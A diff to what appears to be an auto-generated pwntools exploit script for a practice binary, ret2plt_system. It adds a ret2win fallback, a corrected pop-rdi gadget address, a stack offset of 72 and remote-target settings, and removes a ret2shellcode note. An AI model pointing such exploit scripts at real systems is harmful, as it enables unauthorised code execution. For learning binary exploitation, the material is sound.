@@ -77,6 +77,12 @@
 #   system@plt. This is the shortest route available and it is fully
 #   deterministic because PIE is off.
 #
+#   FALLBACK: ret2win (return straight into a winning function) [VIABLE,
+#   score 0.75]: NX rules out shellcode, but the binary contains
+#   unreachable_shell() at 0x4011ff -- a function that already does what
+#   we want. The entire exploit is one address: overwrite the saved return
+#   address with it. No chain, no leak.
+#
 #   FALLBACK: guided triage (discover the missing facts, then re-evaluate)
 #   [VIABLE, score 0.15]: Always available. Rather than assuming a
 #   technique, this route establishes the facts a technique needs --
@@ -84,17 +90,6 @@
 #   offset -- and then tells you which family those facts unlock. Use it
 #   when nothing else scored, or when you want to verify the groundwork
 #   yourself.
-#
-#   RULED OUT: ret2shellcode (execute bytes on the stack) [ruled out
-#   (structural), score 0]: NX is enabled, so the stack is not executable:
-#   shellcode written into the buffer cannot be run, and there is no
-#   `win()`-style function to jump to either. Code execution therefore has
-#   to come from code that is already mapped and already executable --
-#   that is code reuse, which is what every other route in this decision
-#   tree does. Missing: NX disabled (executable stack); or a
-#   win()/give_shell()-style function in the binary. Becomes viable if:
-#   you find a writable+executable region (check `readelf -l` for an RWE
-#   segment, or an mprotect() call the program makes on your behalf)
 #
 # ------------------------------------------------------------------------
 # SUCCESS CRITERIA
@@ -106,6 +101,9 @@
 # Facts in this file were obtained via:
 #   - pwntools/pyelftools via supwngo Binary.load(ret2plt_system)
 #   - supwngo ProtectionAnalyzer (one analyze() call)
+#   - NX/PIE/RELRO/canary derived from the ELF program headers and symbol
+#     table (PT_GNU_STACK flags, ET_DYN, PT_GNU_RELRO + BIND_NOW,
+#     __stack_chk_fail), not from a checksec boolean
 #   - supwngo GadgetFinder (pwntools ROP / ropper / ROPgadget)
 #   - objdump prologue of vuln() for frame size
 #   - GDB cyclic probe (batch mode, no corefile)
@@ -116,8 +114,10 @@
 
 import hashlib
 import os
+import re
 import subprocess
 import sys
+import tempfile
 
 from pwn import *
 
@@ -146,11 +146,11 @@ BINARY_SHA256 = '04aa1ac95df691de820989f0961029e8e1096235026e7862ee92450f70b562f
 BITS = 64
 
 # Set (with REMOTE_PORT) to attack a remote instance.
-# assumed
+# assumed - not measured: operator configuration, empty so the local binary is used (set by hand, or by `supwngo explain --remote HOST:PORT`)
 REMOTE_HOST = ""
 
 # Remote port; 0 means run the local binary.
-# assumed
+# assumed - not measured: operator configuration, 0 so the local binary is used (set by hand, or by `supwngo explain --remote HOST:PORT`)
 REMOTE_PORT = 0
 
 # Bytes from the start of the overflowed buffer to the saved return address. Everything downstream depends on this.
@@ -158,7 +158,7 @@ REMOTE_PORT = 0
 OFFSET = 72
 
 # `pop rdi; ret` gadget.
-# measured - gadget search (pwntools ROP) via `ROPgadget --binary ret2plt_system --only 'pop|ret|syscall' | grep -F 'pop rdi'` (the bytes at this address disassemble to `pop rdi; ret`)
+# measured - gadget search (pwntools ROP) via `ROPgadget --binary ret2plt_system --only 'pop|ret|syscall' | grep -F 'pop rdi'` (the bytes at this address disassemble to `pop rdi; ret`. NOTE: gadget_pop_rdi_ret+4 -- the symbol gadget_pop_rdi_ret itself is at 0x4011f6, but its first 4 bytes are an endbr64 CET landing pad, not your gadget. Use the gadget address.)
 G_POP_RDI = 0x4011fa
 
 # `ret` gadget.
@@ -261,7 +261,7 @@ def require_tool(name, install_hint):
 #     table
 #
 #   # See the gadget bytes with your own eyes
-#   $ objdump -d ret2plt_system | grep -A3 'vuln'
+#   $ objdump -d ret2plt_system | grep -A3 'gadget_pop_rdi_ret'
 #     expect: an endbr64 before the gadget instruction -- which is exactly
 #     why the gadget address is the symbol address plus 4
 #
